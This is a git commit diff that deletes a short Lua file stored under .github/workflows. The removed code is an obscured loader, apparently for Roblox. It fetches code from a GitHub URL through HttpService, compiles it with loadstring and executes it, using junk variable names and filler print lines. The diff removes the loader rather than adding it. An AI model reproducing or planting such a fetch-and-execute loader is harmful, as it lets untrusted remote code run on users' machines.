2db6c4029d1d0878f26b4ff8b61554145061a4c6
hFSA98af979f7a89fsa <138495488+hFSA98af979f7a89fsa@users.noreply.github.com>
2024-01-05 17:53:22 -0800

    Update b.lua

--- .github/workflows/b.lua
+++ .github/workflows/b.lua
@@ -1,14 +1,1 @@
-
-print('a n b b v c x xz ')
-l = game:GetService("HttpService")
-
-fhhhhhhhhhhhggg = function(g)
-	ssssss = l:GetAsync(g)
-	cccccc = loadstring(ssssss)
-	cccccc()
-end
-
-cccbbb = "https://github.com/hFSA98af979f7a89fsa/____/blob/main/.github/workflows/b.lua"
-
-fhhhhhhhhhhhggg(cccbbb)
-print('123213123 n 312b b v c x xz ')
+-
